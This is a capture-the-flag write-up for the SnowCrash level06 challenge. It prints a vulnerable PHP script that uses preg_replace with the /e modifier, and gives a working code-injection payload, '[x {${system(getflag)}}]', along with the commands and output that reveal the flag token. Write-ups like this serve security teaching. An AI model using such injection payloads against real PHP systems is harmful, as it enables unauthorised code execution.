# Solution

So we loged in and in the home folder we directly see two file level06 which is a binary and level06.php which is the source code of that binary.ko

Here is the source code beautify:

```php
#!/usr/bin/php
<?php
function y($m)
{
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}
function x($y, $z)
{
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}
$r = x($argv[1], $argv[2]);
print $r;

?>
```

The vulnerability is here **$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);** the /e is deprecated in php5.0,
this evaluate the php that you provide.

So now that we know that we need to create a file that will contains the first regexp match expresion wich start like this \[x something\]
this we just need to replace something with some php code that will call getflag

```sh
echo '[x {${system(getflag)}}]' > /tmp/input
```

The php code here as juste one tricky part which is the {${system()}} this is string interpolation meaning that the result of the code will be put in the string.
we need two {}, the outer {} is needed so that when we passed in the function y() it's properly interprated as one argument, also system require a string but we can let php do the interpretation of getflag as a string.


Now we execute the program **level06**:

```sh
./level06 /tmp/input
```

here is the result:

```sh
level06@SnowCrash:~$ echo '[x {${system(getflag)}}]'> /tmp/input
level06@SnowCrash:~$ ./level06 /tmp/input
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
